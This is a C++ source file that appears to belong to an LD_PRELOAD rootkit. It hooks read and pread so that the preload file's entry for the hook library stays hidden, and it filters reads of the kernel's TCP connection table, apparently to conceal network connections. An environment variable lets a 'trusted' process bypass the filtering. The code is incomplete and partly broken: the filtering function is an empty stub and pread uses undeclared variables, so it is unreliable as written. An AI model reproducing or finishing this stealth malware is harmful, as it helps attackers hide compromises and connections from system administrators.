
#include "main.h"


static std::string buf;
static size_t bufSize = 4096;
static size_t totalRead, doneLen;



void removeNeedStrings (std::string & hideStr, std::string & buf) {
	
	
	
	return;
}

ssize_t processTcp4Reading (int fd, void *bufPtr, size_t count) {
	CErrnoSaver serr;
	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	WRITE wrPtr = (WRITE)dlsym (RTLD_NEXT, "write");
	LSEEK lskPtr = (LSEEK) dlsym (RTLD_NEXT, "lseek");
	ssize_t ret, totLen = 0;
	
	
	assert (opnPtr != NULL);
	assert (rdPtr != NULL);
	assert (wrPtr != NULL);
	assert (lskPtr != NULL);
	
	if (!totalRead) {
		buf.resize (bufSize);
		while (-1 == (ret = rdPtr (fd, &buf[totLen], buf.size () - totLen - 1)) && errno == EINTR) {
			if (ret == -1 && errno != 0 && errno != EINTR) {
				serr.set (errno);
				return -1;
			}
			if (ret != 0) {
				buf.resize (buf.size () * 2);
				totLen += ret;
			} else {
				// we have got 0, so we have reached the end of the file
				buf[totLen] = '\0';
				break;
			}
		}
		
		std::string hideStr;
		descr_holder fd_t (new int (-1));
		
		*fd_t = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
		lockAllFile (*fd_t);
		
		totLen = 0;
		hideStr.resize (bufSize);
		while (-1 == (ret = rdPtr (*fd_t, &buf[totLen], buf.size () - totLen - 1)) && errno == EINTR) {
			if (ret == -1 && errno != 0 && errno != EINTR) {
				serr.set (errno);
				return -1;
			}
			if (ret != 0) {
				buf.resize (buf.size () * 2);
				totLen += ret;
			} else {
				// we have got 0, so we have reached the end of the file
				buf[totLen] = '\0';
				break;
			}
		}
		
		removeNeedStrings (hideStr, buf);
		totalRead = buf.size ();
	}
	
	if (count >= totalRead) {
		for (size_t i = 0; i < totalRead; ++i)
			static_cast <char*> (bufPtr)[i] = buf[doneLen + i];
		totLen = totalRead;
		doneLen = 0;
		totalRead = 0;
	} else {
		for (size_t i = 0; i < count; ++i)
			static_cast <char*> (bufPtr)[i] = buf[doneLen + i];
		totLen = count;
		doneLen += count;
		totalRead -= count;
	}
	
	
	return totLen;
}

ssize_t processTcp4Reading (int fd, void *buf, size_t count, off_t offset) {
	return 0;
}

ssize_t read (int fd, void *buf, size_t count) {
	CErrnoSaver serr;
	std::string lnkAim, tcp4Str (tcp4Path);
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	LSEEK lskPtr = (LSEEK)dlsym (RTLD_NEXT, "lseek");
	char *chPtr;
	ssize_t ret;
	

	assert (lskPtr != NULL);
	assert (rdPtr != NULL);

	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		if ((ret = rdPtr (fd, buf, count)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
	
	if (lnkAim == prelFileName) {
		if (-1 == lskPtr (fd, SEEK_CUR, (hookLibraryName + separator).size ())) {
			serr.set (EBADF);
			return -1;
		}
	} else if (tcp4Str == lnkAim || haveTcp4Relation (fd)) {
		if (-1 == (ret = processTcp4Reading (fd, buf, count))) {
			serr.set (errno);
		}
		return ret;
	}
	
	
	if ((ret = rdPtr (fd, buf, count)) == -1) {
		serr.set (errno);
	}
	return ret;
}

ssize_t pread (int fd, void *buf, size_t count, off_t offset) {
	CErrnoSaver serr;
	std::string lnkAim;
	READ prdPtr = (READ)dlsym (RTLD_NEXT, "pread");
	char *chPtr;
	

	assert (prdPtr != NULL);

	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		if ((ret = prdPtr (fd, buf, count, offset)) == -1) {
			serr.set (errno);
		}
		return ret;
	}
	
	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
	
	if (lnkAim == prelFileName) {
		if ((ret = rdPtr (fd, buf, count, offset + (hookLibraryName + separator).size ()))) {
			serr.set (errno);
		}
		return ret;
	} else if (tcp4Str == lnkAim || haveTcp4Relation (fd)) {
		if (-1 == (ret = processTcp4Reading (fd, buf, count, offset))) {
			serr.set (errno);
		}
		return ret;
	}
	
	
	if ((ret = prdPtr (fd, buf, count, offset)) == -1) {
		serr.set (errno);
	}
	return ret;
}








